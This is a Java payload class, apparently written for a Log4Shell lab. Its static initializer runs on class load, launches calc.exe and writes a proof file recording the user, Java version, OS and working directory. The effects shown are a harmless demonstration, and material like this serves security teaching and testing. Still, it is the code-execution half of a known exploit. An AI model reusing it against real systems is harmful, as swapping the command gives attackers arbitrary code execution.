import java.io.*;

public class Exploit {
    static {
        try {
            // Visual indicator in console
            System.out.println("\n============================================================");
            System.out.println("[!!!] LOG4SHELL EXPLOIT EXECUTED [!!!]");
            System.out.println("============================================================");

            // Launch calculator as visual proof
            try {
                Runtime.getRuntime().exec("calc.exe");
                System.out.println("[+] Launched calc.exe");
            } catch (Exception e) {
                System.out.println("[!] Could not launch calc.exe: " + e.getMessage());
            }

            // Create proof file ONLY in project folder
            String projectPath = "C:\\Users\\yaniv\\10Root Dropbox\\Yaniv Radunsky\\Documents\\50-59 Projects\\57 ClaudeCode\\57.07_Log4JLab\\PWNED_LOG4SHELL.txt";

            try {
                File file = new File(projectPath);
                FileWriter writer = new FileWriter(file);
                writer.write("=== LOG4SHELL EXPLOIT SUCCESS ===\n");
                writer.write("Time: " + new java.util.Date() + "\n");
                writer.write("User: " + System.getProperty("user.name") + "\n");
                writer.write("Java: " + System.getProperty("java.version") + "\n");
                writer.write("OS: " + System.getProperty("os.name") + "\n");
                writer.write("Working Dir: " + System.getProperty("user.dir") + "\n");
                writer.write("=================================\n");
                writer.close();

                System.out.println("[+] Created proof file: " + projectPath);
            } catch (Exception e) {
                System.out.println("[!] Could not write file: " + e.getMessage());
            }

            System.out.println("============================================================\n");

        } catch (Exception e) {
            System.out.println("[!] Exploit error: " + e.getMessage());
            e.printStackTrace();
        }
    }
}